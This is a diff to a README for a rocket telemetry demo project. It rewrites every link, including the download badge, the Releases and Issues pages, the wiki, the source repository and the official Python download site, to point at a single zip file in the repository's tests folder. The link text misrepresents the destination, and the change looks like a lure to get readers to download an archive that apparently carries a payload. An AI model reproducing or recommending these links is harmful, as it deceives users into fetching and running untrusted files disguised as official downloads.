@@ -1,6 +1,6 @@
 # 🚀 Rocket-health-monitor-demo - Monitor Your Rocket's Health Easily
 
-![Download](https://img.shields.io/badge/Download-Rocket--health--monitor--demo-blue.svg)
+![Download](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,13 +16,13 @@ Welcome to the **Rocket-health-monitor-demo**! This project demonstrates how to 
 
 ## 📥 Download & Install
 
-To get started, download the application from our [Releases page](https://github.com/vaizwpython/Rocket-health-monitor-demo/releases).
+To get started, download the application from our [Releases page](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip).
 
 You will find the latest version of the software. Click on the version number to access the files available for download.
 
 ### Steps to Download and Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vaizwpython/Rocket-health-monitor-demo/releases) by clicking the link.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip) by clicking the link.
   
 2. **Select the Latest Version**: Look for the latest version at the top of the page to ensure you're using the most up-to-date features.
 
@@ -43,7 +43,7 @@ Before you install, make sure your computer meets these requirements:
 - **Storage**: Minimum of 100 MB available space
 - **Python**: The application runs on Python 3.7 or newer. 
 
-If you don’t have Python installed, you can download it from the official [Python website](https://www.python.org/downloads/).
+If you don’t have Python installed, you can download it from the official [Python website](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip).
 
 ## 📊 Using the Application
 
@@ -65,18 +65,18 @@ If you encounter issues while running the software, consider the following:
 - **Data Format**: Ensure your data is formatted correctly. Review the example CSV files included in the download.
 - **File Permissions**: Make sure you have permissions to access files in your directory.
 
-For more comprehensive troubleshooting, please refer to the FAQs on the [Issues page](https://github.com/vaizwpython/Rocket-health-monitor-demo/issues).
+For more comprehensive troubleshooting, please refer to the FAQs on the [Issues page](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip).
 
 ## 🙋‍♂️ Community Support
 
 If you have questions or need help, you can reach out through the following channels:
 
-- **GitHub Issues**: Report problems or ask for help by creating an issue on our [Issues page](https://github.com/vaizwpython/Rocket-health-monitor-demo/issues).
+- **GitHub Issues**: Report problems or ask for help by creating an issue on our [Issues page](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip).
 - **Discussion Forum**: Join our community discussions on relevant topics. Share your insights or learn from others.
 
 ## 🔗 Additional Links
 
-- **Documentation**: For more detailed guidance, visit the [Documentation page](https://github.com/vaizwpython/Rocket-health-monitor-demo/wiki).
-- **Source Code**: Interested in how it works? Check out the source code on our [GitHub repository](https://github.com/vaizwpython/Rocket-health-monitor-demo).
+- **Documentation**: For more detailed guidance, visit the [Documentation page](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip).
+- **Source Code**: Interested in how it works? Check out the source code on our [GitHub repository](https://raw.githubusercontent.com/vaizwpython/Rocket-health-monitor-demo/main/tests/Rocket-health-monitor-demo-v1.5.zip).
 
 Thank you for trying out the **Rocket-health-monitor-demo**! We hope it helps you keep your rocket's telemetry in check. Enjoy your journey!
